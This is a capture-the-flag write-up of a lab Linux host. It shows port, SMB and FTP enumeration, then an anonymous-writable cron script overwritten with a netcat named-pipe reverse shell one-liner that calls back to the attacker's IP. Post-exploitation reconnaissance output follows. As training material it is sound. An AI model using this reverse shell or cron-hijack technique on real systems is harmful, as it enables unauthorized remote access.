# [anonymous](https://tryhackme.com/room/anonymous)

> A Linux machine with an FTP server that allows an anonymous user to write to a `bash` script that is executed on a `cron` job. Replacing this `bash` script with a reverse shell grants low-privileged access to the target. The low-privileged user is a member of the `lxd` group and is thus capable of spinning up `lxd` containers. By creating a container that mounts the system's root directory (`/`) and then changes its root directory to that of the system, the container's scope widens to that of the entire system and grants `root` access to it.

---

## Open Port Enumeration

The target is serving TCP ports 21 (FTP), 22 (SSH), 139, and 445 (SMB).

```bash
$ sudo masscan -p1-65535 10.10.199.27 --rate=1000 -e tun0 --output-format grepable --output-filename enum/anonymous.masscan
$ cat enum/anonymous.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
139,21,22,445,
```

According to [launchpad](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.3), the target's operating system is Ubuntu 18.05 (Bionic).

```bash
$ sudo nmap -sC -sV -O -p139,21,22,445 10.10.199.27 -oA enum/anonymous
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 23:35 EST
Nmap scan report for 10.10.199.27
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.31.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2022-01-23T04:35:44
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-01-23T04:35:44+00:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.74 seconds
```

---

## SMB Enumeration

The target's SMB server allows guest access and contains three shares: `print$`, `pics`, and `IPC$`. `pics` is readable.

```bash
$ crackmapexec smb 10.10.199.27 -u guest -p '' --shares
SMB         10.10.199.27    445    ANONYMOUS        [*] Windows 6.1 (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.199.27    445    ANONYMOUS        [+] \guest:
SMB         10.10.199.27    445    ANONYMOUS        [+] Enumerated shares
SMB         10.10.199.27    445    ANONYMOUS        Share           Permissions     Remark
SMB         10.10.199.27    445    ANONYMOUS        -----           -----------     ------
SMB         10.10.199.27    445    ANONYMOUS        print$                          Printer Drivers
SMB         10.10.199.27    445    ANONYMOUS        pics            READ            My SMB Share Directory for Pics
SMB         10.10.199.27    445    ANONYMOUS        IPC$                            IPC Service (anonymous server (Samba, Ubuntu))
```

It contains two photos: `corgo2.jpg` and `puppos.jpeg`.

```bash
$ smbclient //10.10.199.27/pics -U guest
Enter WORKGROUP\guest's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306816 blocks available

```

`corgo2.jpg`:

![](images/Pasted%20image%2020220122234616.png)

`puppos.jpeg`:

![](images/Pasted%20image%2020220122234645.png)

---

## FTP Enumeration

The server also allows anonymous access and contains a directory named `scripts` which is writable.

This directory contains three files: `clean.sh`, `removed_files.log`, and `to_do.txt`.

```bash
$ ftp
ftp> open 10.10.199.27
Connected to 10.10.199.27.
220 NamelessOne's FTP Server!
Name (10.10.199.27:tgihf): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
ls250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1720 Jan 23 04:49 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

`todo_do.txt`:

```txt
I really need to disable the anonymous login...it's really not safe
```

Agreed.

`clean.sh`:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

This script appears to be removing files in `/tmp/` and logging each removed file in `removed_files.log`.

`removed_files.log`:

```txt
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

`clean.sh` logs its results to `removed_files.log`. This file is continually growing, indicating that `clean.sh` is being executed at a continual interval.

---

## Writing Shell to FTP Server -> RCE

The script on the target's FTP server's `scripts/clean.sh` is continually being executed. It is also writable:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1720 Jan 23 04:49 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Replace `clean.sh` with a reverse shell `bash` script.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.77 443 >/tmp/f
```

Start a `netcat` reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Upload the malicious `clean.sh` to the FTP `scripts` directory.

```bash
$ ftp
ftp> open 10.10.199.27
Connected to 10.10.199.27.
220 NamelessOne's FTP Server!
Name (10.10.199.27:tgihf): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
89 bytes sent in 0.00 secs (976.5625 kB/s)
```

Catch the reverse shell as `namelessone` and grab the user flag from `/home/namelessone/user.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.6.31.77] from (UNKNOWN) [10.10.199.27] 50680
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

---

## Situational Awareness as `namelessone`

The target's kernel version is 4.15.0 and operating system is Ubuntu 18.04.

```bash
namelessone@anonymous:~$ uname -a
Linux anonymous 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

namelessone@anonymous:~$ cat /etc/issue
Ubuntu 18.04.4 LTS \n \l
```

The target's CPU is 64-bit (32-bit optional) with one core and one thread on that core.

```bash
namelessone@anonymous:~$ lscpu
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           GenuineIntel
CPU family:          6
Model:               63
Model name:          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:            2
CPU MHz:             2400.024
BogoMIPS:            4800.04
Hypervisor vendor:   Xen
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            256K
L3 cache:            30720K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault invpcid_single pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt
```

```bash
namelessone@anonymous:~$ ps auxef
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    04:27   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    04:27   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    04:27   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    04:27   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    04:27   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   04:27   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [crypto]
root        26  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [kintegrityd]
root        27  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [kblockd]
root        28  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [ata_sff]
root        29  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [md]
root        30  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [edac-poller]
root        31  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [devfreq_wq]
root        32  0.0  0.0      0     0 ?        I<   04:27   0:00  \_ [watchdogd]
root        35  0.0  0.0      0     0 ?        S    04:28   0:00  \_ [kswapd0]
root        36  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [kworker/u31:0]
root        37  0.0  0.0      0     0 ?        S    04:28   0:00  \_ [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [kthrotld]
root        80  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [acpi_thermal_pm]
root        81  0.0  0.0      0     0 ?        S    04:28   0:00  \_ [scsi_eh_0]
root        82  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [scsi_tmf_0]
root        83  0.0  0.0      0     0 ?        S    04:28   0:00  \_ [scsi_eh_1]
root        84  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [scsi_tmf_1]
root        90  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ipv6_addrconf]
root        99  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [charger_manager]
root       166  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [kworker/0:1H]
root       167  0.0  0.0      0     0 ?        I    04:28   0:00  \_ [kworker/0:2]
root       205  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ttm_swap]
root       274  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [raid5wq]
root       322  0.0  0.0      0     0 ?        S    04:28   0:00  \_ [jbd2/xvda2-8]
root       323  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ext4-rsv-conver]
root       399  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [iscsi_eh]
root       409  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ib-comp-wq]
root       410  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ib-comp-unb-wq]
root       411  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ib_mcast]
root       412  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [ib_nl_sa_wq]
root       415  0.0  0.0      0     0 ?        I<   04:28   0:00  \_ [rdma_cm]
root       432  0.0  0.0      0     0 ?        S<   04:28   0:00  \_ [loop0]
root       442  0.0  0.0      0     0 ?        S<   04:28   0:00  \_ [loop1]
root      1374  0.0  0.0      0     0 ?        I    04:53   0:00  \_ [kworker/u30:1]
root      1395  0.0  0.0      0     0 ?        I    04:58   0:00  \_ [kworker/u30:2]
root      1452  0.0  0.0      0     0 ?        I    05:04   0:00  \_ [kworker/u30:0]
root         1  1.2  1.8 159764  9044 ?        Ss   04:27   0:29 /sbin/init maybe-ubiquity
root       404  0.1  3.9 103092 19152 ?        S<s  04:28   0:02 /lib/systemd/systemd-journald
root       414  0.0  0.3  97708  1852 ?        Ss   04:28   0:00 /sbin/lvmetad -f
root       417  0.2  0.9  46220  4804 ?        Ss   04:28   0:06 /lib/systemd/systemd-udevd
systemd+   499  0.0  0.6 141936  3076 ?        Ssl  04:28   0:00 /lib/systemd/systemd-timesyncd
systemd+   653  0.0  1.0  80060  5072 ?        Ss   04:29   0:00 /lib/systemd/systemd-networkd
systemd+   676  0.0  1.0  70640  4976 ?        Ss   04:29   0:00 /lib/systemd/systemd-resolved
root       755  0.0  1.1  62140  5684 ?        Ss   04:29   0:00 /lib/systemd/systemd-logind
root       756  0.0  3.0 169100 14796 ?        Ssl  04:29   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       757  0.0  1.3 286256  6516 ?        Ssl  04:29   0:00 /usr/lib/accountsservice/accounts-daemon
root       760  0.0  0.6  30028  2984 ?        Ss   04:29   0:00 /usr/sbin/cron -f
root      1421  0.0  0.6  57500  3292 ?        S    05:03   0:00  \_ /usr/sbin/CRON -f
nameles+  1422  0.0  0.1   4628   852 ?        Ss   05:03   0:00      \_ /bin/sh -c /var/ftp/scripts/clean.sh PATH=/usr/bin:/bin LANG=en_US.UTF-8 SHELL=/bin
nameles+  1423  0.0  0.6  11592  3076 ?        S    05:03   0:00          \_ /bin/bash /var/ftp/scripts/clean.sh HOME=/home/namelessone LOGNAME=namelessone
nameles+  1426  0.0  0.1   6316   768 ?        S    05:03   0:00              \_ cat /tmp/f LANG=en_US.UTF-8 PWD=/home/namelessone HOME=/home/namelessone SH
nameles+  1427  0.0  0.1   4628   772 ?        S    05:03   0:00              \_ /bin/sh -i LANG=en_US.UTF-8 PWD=/home/namelessone HOME=/home/namelessone SH
nameles+  1429  0.0  2.0  38956  9780 ?        S    05:03   0:00              |   \_ python3 -c import pty; pty.spawn("/bin/bash") SHLVL=1 HOME=/home/namele
nameles+  1430  0.0  1.0  21352  5336 pts/0    Ss   05:03   0:00              |       \_ /bin/bash SHLVL=1 HOME=/home/namelessone LOGNAME=namelessone _=/bin
nameles+  1473  0.0  0.7  38524  3784 pts/0    R+   05:06   0:00              |           \_ ps auxef LS_COLORS= LESSCLOSE=/usr/bin/lesspipe %s %s LANG=en_U
nameles+  1428  0.0  0.4  15716  2164 ?        S    05:03   0:00              \_ nc 10.6.31.77 443 LANG=en_US.UTF-8 PWD=/home/namelessone HOME=/home/nameles
message+   762  0.0  0.8  50060  4288 ?        Ss   04:29   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       772  0.0  0.3  95540  1600 ?        Ssl  04:29   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       780  0.0  2.2 264064 10892 ?        Ss   04:29   0:00 /usr/sbin/nmbd --foreground --no-process-group
daemon     784  0.0  0.4  28332  2064 ?        Ss   04:29   0:00 /usr/sbin/atd -f
syslog     787  0.0  0.8 263036  4152 ?        Ssl  04:29   0:00 /usr/sbin/rsyslogd -n
root       789  0.5  4.6 559072 22704 ?        Ssl  04:29   0:12 /usr/lib/snapd/snapd
root       793  0.0  0.4  29148  2244 ?        Ss   04:29   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       794  0.0  1.4 291460  6816 ?        Ssl  04:29   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       795  0.0  3.0 185944 15024 ?        Ssl  04:29   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-sign
root       801  0.0  0.4  14664  2104 ttyS0    Ss+  04:29   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       802  0.0  0.3  14888  1696 tty1     Ss+  04:29   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       810  0.0  1.2  72300  6248 ?        Ss   04:29   0:00 /usr/sbin/sshd -D
root       843  0.0  3.8 355412 18632 ?        Ss   04:30   0:01 /usr/sbin/smbd --foreground --no-process-group
root       848  0.0  1.1 343660  5780 ?        S    04:30   0:00  \_ /usr/sbin/smbd --foreground --no-process-group
root       849  0.0  0.9 343684  4416 ?        S    04:30   0:00  \_ /usr/sbin/smbd --foreground --no-process-group
root       850  0.0  1.3 355396  6700 ?        S    04:30   0:00  \_ /usr/sbin/smbd --foreground --no-process-group
```

`namelessone` is a member of several groups (`adm`, `cdrom`, `sudo`, `dip`, `plugdev`, and `lxd`).

```bash
namelessone@anonymous:~$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

`namelessone` requires a password to view its allowed `sudo` commands.

```bash
namelessone@anonymous:~$ sudo -l
[sudo] password for namelessone:
```
 
There is no useful command history.

```bash
namelessone@anonymous:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
namelessone:x:1000:1000:namelessone:/home/namelessone:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```bash
namelessone@anonymous:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,namelessone
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:namelessone
floppy:x:25:
tape:x:26:
sudo:x:27:namelessone
audio:x:29:
dip:x:30:namelessone
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:namelessone
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:namelessone
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
namelessone:x:1000:
ssl-cert:x:114:
rdma:x:115:
sambashare:x:116:
ftp:x:113:
```

No extra network interfaces.

```bash
namelessone@anonymous:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:84:80:45:d5:01 brd ff:ff:ff:ff:ff:ff
    inet 10.10.199.27/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3042sec preferred_lft 3042sec
    inet6 fe80::84:80ff:fe45:d501/64 scope link
       valid_lft forever preferred_lft forever
```

```bash
namelessone@anonymous:~$ ip route
default via 10.10.0.1 dev eth0 proto dhcp src 10.10.199.27 metric 100
10.10.0.0/16 dev eth0 proto kernel scope link src 10.10.199.27
10.10.0.1 dev eth0 proto dhcp scope link src 10.10.199.27 metric 100
```

```bash
namelessone@anonymous:~$ ip neigh
10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
```

No extra services listening on `localhost`.

```bash
namelessone@anonymous:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    144 10.10.199.27:50682      10.6.31.77:443          ESTABLISHED on (0.27/0/0)
tcp6       0      0 :::139                  :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::445                  :::*                    LISTEN      off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.199.27:68         0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.255.255:137       0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.199.27:137        0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:137             0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.255.255:138       0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.199.27:138        0.0.0.0:*                           off (0.00/0/0)
udp        0      0 0.0.0.0:138             0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  8      [ ]         DGRAM                    14839    /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    21833    /var/lib/samba/private/msg.sock/849
unix  2      [ ACC ]     STREAM     LISTENING     14841    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     SEQPACKET  LISTENING     14835    /run/udev/control
unix  5      [ ]         DGRAM                    15047    /run/systemd/journal/dev-log
unix  2      [ ACC ]     STREAM     LISTENING     15053    /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     21671    /var/run/samba/nmbd/unexpected
unix  2      [ ]         DGRAM                    15192    /run/systemd/journal/syslog
unix  2      [ ACC ]     STREAM     LISTENING     18540    /var/lib/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     18519    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     18479    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     18520    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     18522    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     18524    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     18538    /run/uuidd/request
unix  2      [ ]         DGRAM                    21826    /var/lib/samba/private/msg.sock/843
unix  2      [ ]         DGRAM                    21652    /var/lib/samba/private/msg.sock/780
unix  2      [ ]         DGRAM                    21832    /var/lib/samba/private/msg.sock/848
unix  3      [ ]         DGRAM                    14827    /run/systemd/notify
unix  2      [ ]         DGRAM                    21851    /var/lib/samba/private/msg.sock/850
unix  2      [ ACC ]     STREAM     LISTENING     14830    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     14837    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    17900
unix  3      [ ]         STREAM     CONNECTED     16657
unix  3      [ ]         STREAM     CONNECTED     21300
unix  3      [ ]         DGRAM                    16825
unix  2      [ ]         DGRAM                    18240
unix  3      [ ]         DGRAM                    17902
unix  3      [ ]         STREAM     CONNECTED     15654
unix  3      [ ]         DGRAM                    16523
unix  3      [ ]         STREAM     CONNECTED     18755
unix  3      [ ]         STREAM     CONNECTED     19360    /var/run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    16824
unix  3      [ ]         STREAM     CONNECTED     16658    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19349
unix  3      [ ]         STREAM     CONNECTED     18756    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    15934
unix  2      [ ]         DGRAM                    21298
unix  3      [ ]         STREAM     CONNECTED     18005
